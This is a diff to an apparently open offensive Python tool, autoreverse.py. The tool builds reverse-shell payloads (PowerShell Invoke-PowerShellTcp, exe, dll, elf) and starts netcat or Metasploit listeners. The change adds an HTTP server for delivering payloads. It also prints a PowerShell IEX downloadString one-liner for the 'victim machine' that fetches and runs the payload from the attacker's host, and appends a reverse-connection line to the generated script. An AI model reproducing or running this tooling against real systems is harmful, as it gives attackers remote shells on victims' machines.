@@ -15,12 +15,15 @@ ap.add_argument('-l', '--listener', required=False, type=str, help='Create a lis
 
 ap.add_argument('-a', '--architecture', required=False, type=str, help='Define the architecture of the machine: x64 or x86 (default value is x64, only needed with .exe, .dll and .elf payloads).')
 
+ap.add_argument('-http', '--httpserver', required=False, type=str, help='Create an http server on the port you specified.')
+
 args = ap.parse_args()
 
 ActualPath = os.popen('pwd').read().replace('\n', '')
 
 if os.path.exists('/usr/local/bin/autoreverse.py') == False:
     print(blue('\nCreating a symbolik link so you can use the tool in all directories (autoreverse.py).'))
+    os.system('dos2unix autoreverse.py 2>/dev/null')
     os.system('chmod +x autoreverse.py')
     os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse.py')
 
@@ -36,12 +39,19 @@ port = args.port
 
 try:
     int(port)
+    if args.httpserver != None:
+        int(args.httpserver)
 except:
     print(red('The port must be a number'))
     exit()
 
 def Get_IP(NT = args.interface):
-    return os.popen("ifconfig " + str(NT) + " | sed -n '2 p' | awk '{print $2}'").read().replace('\n', '')
+    IP = os.popen("ifconfig " + str(NT) + " 2>/dev/null | sed -n '2 p' | awk '{print $2}'").read().replace('\n', '')
+    if IP == '':
+        print(red("Your network interface doesn't exists."))
+        exit()
+    else:
+        return IP
 
 def nc_list():
     if payload == 'exe' or payload == '.exe' or payload == 'dll' or payload == '.dll':
@@ -65,7 +75,7 @@ def msf_list(IP = Get_IP(), PORT = port):
         os.system(command.replace('windows', 'linux'))
 
 def message(file, ActualPath = ActualPath):
-    print(blue(('Your payload ' + red(file) + blue(' is located in ') +  red(ActualPath) + blue(' and ready to upload.\n'))))
+    print(blue(('\nYour payload ' + red(file) + blue(' is located in ') +  red(ActualPath) + blue(' and ready to upload.\n'))))
 
 def Check_files(file):
     path = '/opt/autoreverse/'
@@ -121,6 +131,8 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         Check_files(file)
         os.system('cp /opt/autoreverse/autoreverse.ps1 .')
         os.system('echo "Invoke-PowerShellTcp -Reverse -IPAddress ' + IP + ' -Port ' + PORT + '" >> autoreverse.ps1')
+        if args.httpserver != None:
+            print(blue('\nInstall your payload on the victim machine with: ') + red("\npowershell IEX(New-Object Net.WebClient).downloadString('http://" + IP + ":" + args.httpserver + "/" + file + "')"))
         message(file)
     elif payload == 'exe' or payload == '.exe':
         file = 'autoreverse.exe'
@@ -136,11 +148,13 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         print(red('You payload option is not in the list, use "--help" to know the payloads list.'))
         exit()
 
-if args.listener != None:
+def Check_Port(port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    if s.connect_ex(('127.0.0.1', int(args.port))) == 0:
+    if s.connect_ex(('127.0.0.1', int(port))) == 0:
         print(red('The port is already in use.'))
         exit()
+
+def listeners():
     if args.listener == 'nc' or args.listener == 'netcat':
         if arch == 'none':
             Configure()
@@ -160,7 +174,13 @@ if args.listener != None:
         print(red('Your listener option is not in the list, use "--help" to know the listeners list.'))
         exit()
 
-if arch == 'none':
-    Configure()
-else:
-    Configure(arch = arch)
+if args.httpserver != None:
+    Check_Port(args.httpserver)
+    server = 'python3 -m http.server ' + str(args.httpserver) + ' > autoreverse.log 2>/dev/null &'
+    os.system(server)
+    print(blue('HTTP Server running on port ' + str(args.httpserver)))
+if args.listener != None:
+    Check_Port(args.port)
+    listeners()
+
+Configure()
